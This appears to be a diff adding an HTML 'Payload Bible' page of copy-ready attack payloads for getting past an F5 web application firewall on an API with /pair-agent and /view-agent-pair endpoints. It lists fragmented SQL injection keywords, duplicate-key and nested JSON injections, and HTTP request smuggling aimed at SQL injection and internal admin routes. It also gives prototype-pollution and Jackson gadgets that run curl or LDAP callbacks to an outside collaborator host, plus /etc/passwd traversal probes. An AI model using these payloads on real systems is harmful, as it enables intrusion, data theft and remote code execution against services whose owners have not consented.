+        <div class="prow"><div class="prow-code">Content-Type: application/javascript</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/JSON</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: Application/Json</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/json; charset=utf-7</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/json ;</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/json, */*</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/json+xml</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/merge-patch+json</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Content-Type: application/vnd.api+json</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">SQL Keyword Fragment — All Breakpoints</div><div class="pcard-sub">split every blocked keyword · comment insert · versioned comments</div></div>
+      <span class="sev s-high">HIGH</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Rule:</b> F5 confirmed to block <code>alert</code>. Same pattern applies to SQL: it blocks <code>UNION</code>, <code>SELECT</code>, <code>SLEEP</code>, <code>OR</code>, <code>AND</code> in raw form. Fragment them at every possible split point.</div>
+      <div class="payload-list">
+        <div class="grp">UNION fragments</div>
+        <div class="prow"><div class="prow-code">UN/**/ION</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">U/**/N/**/I/**/O/**/N</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">/*!UNION*/</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">/*!50000UNION*/</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">\u0055\u004e\u0049\u004f\u004e</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">SELECT fragments</div>
+        <div class="prow"><div class="prow-code">SEL/**/ECT</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">S/**/E/**/L/**/E/**/C/**/T</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">/*!SELECT*/</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">/*!50000SELECT*/</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">\u0053\u0045\u004c\u0045\u0043\u0054</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">SLEEP fragments</div>
+        <div class="prow"><div class="prow-code">SL/**/EEP</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">S/**/L/**/E/**/E/**/P</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">/*!SLEEP*/</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">\u0053\u004c\u0045\u0045\u0050</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">AND / OR fragments</div>
+        <div class="prow"><div class="prow-code">O/**/R</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">A/**/N/**/D</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">/*!OR*/</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">/*!AND*/</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S11: JSON STRUCTURE BYPASS -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s11">
+  <div class="sec-head"><span class="sec-num">11</span><span class="sec-title" style="color:var(--red)">F5 Bypass — JSON Structure Attacks</span></div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Duplicate Key Differential + Array Wrapping</div><div class="pcard-sub">parser split · array type coercion · nested wrapper objects</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Duplicate key — WAF sees first (clean), backend uses last (injected)</div>
+        <div class="prow"><div class="prow-code">{"Agentid":"anon","Agentid":"' OR 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid":"anon","Agentid":"admin"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid":"anon","Agentid":"' UNION SELECT password FROM users--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Array wrapping</div>
+        <div class="prow"><div class="prow-code">[{"Agentid": "anon' OR 1=1--"}]</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": ["anon", "admin"]}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": ["anon' OR 1=1--"]}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Wrapper object — F5 JSON inspection depth limit</div>
+        <div class="prow"><div class="prow-code">{"data": {"Agentid": "anon' OR 1=1--"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"request": {"Agentid": "anon' OR 1=1--"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"a":{"b":{"c":{"d":{"Agentid":"anon' OR 1=1--"}}}}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">HTTP Parameter Pollution — URL safe, body injected</div>
+        <div class="prow"><div class="prow-code">POST /view-agent-pair?Agentid=anon  →  body: {"Agentid":"anon' OR 1=1--"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">POST /view-agent-pair?Agentid=anon&Agentid=admin  →  body: {"Agentid":"safe"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S13-15: HTTP/1.1 SMUGGLING -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s13">
+  <div class="sec-head"><span class="sec-num">13</span><span class="sec-title" style="color:var(--red)">HTTP/1.1 Request Smuggling — CL.TE / TE.CL / TE.TE</span><span class="pill p-red">WAF INVISIBLE</span></div>
+  <div class="note" style="margin-bottom:12px"><b>Why it beats F5:</b> The smuggled request prefix is NEVER passed through F5's inspection pipeline. It arrives at the backend server directly from the TCP buffer. The WAF only ever saw clean request #1.</div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">CL.TE — Smuggle SQLi Past F5</div><div class="pcard-sub">F5 uses Content-Length · backend uses Transfer-Encoding · gap = invisible request</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Detection — send then follow up with normal request, check for error</div>
+        <div class="prow"><div class="prow-code">POST /pair-agent HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /doesnotexist404 HTTP/1.1
+X-Z: Z</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Smuggle SQLi payload to view-agent-pair (WAF never sees it)</div>
+        <div class="prow"><div class="prow-code">POST /pair-agent HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Content-Length: 168
+Transfer-Encoding: chunked
+
+0
+
+POST /view-agent-pair HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Content-Length: 45
+
+{"Agentid": "admin'/**/OR/**/'1'='1"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Smuggle to internal admin endpoint</div>
+        <div class="prow"><div class="prow-code">POST /pair-agent HTTP/1.1
+Host: target.com
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/agents HTTP/1.1
+Host: target.com
+X-Internal: true
+
+</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">TE.TE — Transfer-Encoding Header Obfuscation Suite</div><div class="pcard-sub">18 variants · case · duplicate · whitespace · invalid · folding</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="note"><b>Method:</b> Send 2 Transfer-Encoding headers. F5 honors one (e.g. identity). Backend honors the other (chunked). Each parses body boundary differently → desync.</div>
+      <div class="payload-list">
+        <div class="grp">Duplicate TE headers</div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: chunked
+Transfer-Encoding: identity</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: identity
+Transfer-Encoding: chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Case variants</div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: Chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: CHUNKED</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: ChUnKeD</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-encoding: chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">TRANSFER-ENCODING: chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Whitespace / spacing variants</div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding : chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding:chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding:  chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: xchunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: chunked, identity</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: identity, chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Header folding (deprecated, some servers still parse)</div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding:
+  chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Invalid / unknown value (fallback to CL)</div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: cow</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">Transfer-Encoding: chunked\x00</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">X-Transfer-Encoding: chunked</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S16: DESERIALIZATION -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s16">
+  <div class="sec-head"><span class="sec-num">16</span><span class="sec-title" style="color:var(--cyan)">Deserialization + Prototype Pollution</span></div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Prototype Pollution + Jackson + Node.js RCE</div><div class="pcard-sub">__proto__ · @class gadgets · template engine RCE via pollution</div></div>
+      <span class="sev s-crit">CRITICAL</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Prototype pollution — Node.js</div>
+        <div class="prow"><div class="prow-code">{"__proto__": {"admin": true}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"__proto__": {"isAdmin": true, "role": "admin"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"constructor": {"prototype": {"admin": true}}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon", "__proto__": {"admin": true}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Prototype pollution RCE gadgets</div>
+        <div class="prow"><div class="prow-code">{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('curl http://COLLAB/$(id)')//"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"__proto__": {"pendingContent": "{{7*7}}"}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Jackson polymorphic — Java/Spring</div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"@class": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://COLLAB:1389/exploit","autoCommit": true}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://COLLAB/Exploit","autoCommit": true}}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════ -->
+<!-- S18: RECON -->
+<!-- ══════════════════════════════════════════════ -->
+<div class="section" id="s18">
+  <div class="sec-head"><span class="sec-num">18</span><span class="sec-title" style="color:var(--cyan)">Recon / Error-Based Info Leak</span></div>
+
+  <div class="pcard">
+    <div class="pcard-head" onclick="tog(this)">
+      <div><div class="pcard-title">Error Trigger Payloads — DB/Framework Fingerprint</div><div class="pcard-sub">force verbose errors · stack traces · version disclosure</div></div>
+      <span class="sev s-med">MED</span><span class="chev">›</span>
+    </div>
+    <div class="pcard-body">
+      <div class="payload-list">
+        <div class="grp">Invalid types / missing fields</div>
+        <div class="prow"><div class="prow-code">{}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": null}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": [1,2,3]}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": 9999999999999999999999}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon", "Id": "abc"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"wrong": "body"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Null byte injection</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u0000"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "anon\u0000admin"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">Path traversal attempts</div>
+        <div class="prow"><div class="prow-code">{"Agentid": "../../../etc/passwd"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">{"Agentid": "..%2f..%2f..%2fetc%2fpasswd"}</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="grp">HTTP method recon</div>
+        <div class="prow"><div class="prow-code">OPTIONS /pair-agent HTTP/1.1</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">TRACE /pair-agent HTTP/1.1</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">GET /pair-agent HTTP/1.1  (GET on POST-only)</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">GET /api/v1/pair-agent HTTP/1.1</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">GET /api/v2/pair-agent HTTP/1.1</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+        <div class="prow"><div class="prow-code">GET /internal/pair-agent HTTP/1.1</div><button class="prow-btn" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="footer"><span>// h4msa</span> · Payload Bible v3 · F5 oracle: alert=blocked, prompt=passes · All payloads for authorized testing only</div>
+</main>
+</div>
+
+<script>
+function tog(h){h.parentElement.classList.toggle('open');}
+
+function cp(btn){
+  // grab the prow-code sibling
+  const row=btn.parentElement;
+  const code=row.querySelector('.prow-code');
+  if(!code)return;
+  const txt=code.innerText.trim();
+  navigator.clipboard.writeText(txt).then(()=>{
+    const orig=btn.textContent;
+    btn.textContent='✓';
+    btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent=orig;btn.classList.remove('copied');},1400);
+  }).catch(()=>{
+    // fallback
+    const ta=document.createElement('textarea');
+    ta.value=txt;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    btn.textContent='✓';
+    setTimeout(()=>btn.textContent='COPY',1400);
+  });
+}
+
+// open first card in each section by default
+document.querySelectorAll('.section').forEach(s=>{
+  const first=s.querySelector('.pcard');
+  if(first)first.classList.add('open');
+});
+</script>
+</body>
+</html>
